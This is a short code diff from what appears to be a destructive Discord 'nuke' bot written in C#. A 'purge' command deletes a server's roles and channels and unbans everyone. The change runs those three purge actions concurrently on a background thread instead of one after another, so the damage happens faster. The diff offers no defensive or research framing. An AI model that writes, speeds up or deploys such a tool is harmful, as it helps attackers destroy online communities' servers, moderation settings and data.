@@ -32,9 +32,14 @@ namespace REE6
         {
             await ReplyAsync("Purging everything...");
             await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
-            await PurgeActions.RolePurge(Context.Guild);
-            await PurgeActions.ChannelPurge(Context.Guild);
-            await PurgeActions.Unban(Context.Guild);
+            System.Threading.Thread thread = new System.Threading.Thread(delegate() {
+                Task.Run(() => PurgeActions.RolePurge(Context.Guild));
+                Task.Run(() => PurgeActions.ChannelPurge(Context.Guild));
+                Task.Run(() => PurgeActions.Unban(Context.Guild)); 
+            });
+
+            thread.IsBackground = true;
+            thread.Start();
         }
 
         [Command("roles")]
